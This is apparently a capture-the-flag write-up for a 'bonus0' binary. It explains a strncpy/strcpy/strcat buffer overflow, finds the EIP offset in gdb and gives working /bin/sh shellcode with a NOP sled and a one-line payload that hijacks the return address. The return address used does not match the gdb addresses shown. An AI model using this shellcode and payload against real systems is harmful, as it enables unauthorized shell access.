Opening the binary in [dogbolt](https://dogbolt.org/) show us the vulnerability that we will exploit.
We see that the function `pp` call a function `p` to fill two string defined in `pp`.

In the function `p` we see that it read more that it return (read 4095 char return 20 char) since the function use a `strncpy` to return a new string and that `strncpy` does not put a `\0` at the end of the string, if you copy a string where it length is equal or greater than the length given in parameter to `strncpy`

In the `pp` function we see that it use a `strcpy` to copy the first input in a buffer `dest`. We know that this `strcpy` copy chars until a `\0`. The function return the result `strcat` between `dest` and the second input.

We will use the way `strcpy` copy until a `\0` with the fact that `strncpy` don't put a `\0` in some case to put input1 + input2 in `dest`. After `strcat` `dest` will overflow: `len(dest)` ==  42 < `len(input 1) + len(input 2) + 1 + len(input 2)`
The program will do something like:
[Input 1][Input 2] [Input 2]

We will start by finding the offset where we overflow in the `$eip`:
``` Shell
(gdb) r
Starting program: /home/user/bonus0/bonus0 
 - 
01234567890123456789
 - 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
01234567890123456789Aa0Aa1Aa2Aa3Aa4Aa5Aa Aa0Aa1Aa2Aa3Aa4Aa5Aa

Program received signal SIGSEGV, Segmentation fault.
0x41336141 in ?? ()
```
This give us the offset of : 9

We will put a shell code in our environment since there is not the size needed to put it after the offset.

We will place a NOP sled before the shellcode  to facilitate it's finding, since NOP instruction perform no operation, the execution will go through the NOP sled until our shellcode.
``` Shell
export SHELLCODE=$(python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
```

We find an address in the middle of the NOP sled using gdb:
```
(gdb) x/s *((char **)environ)
0xbffff888:      "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343\211\301\211°\v̀1\300@̀"
(gdb) x/s 0xbffff899
0xbffff899:      "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343\211\301\211°\v̀1\300@̀"
```

First arg:          |Second arg:
[fill the first arg]|[offset][address of the shellcode][fill the rest]
```
(python -c 'print "A" * 20'; python -c 'print "B" * 9 + "\xd8\xf7\xff\xbf" + "B"*7'; cat) | ./bonus0
```
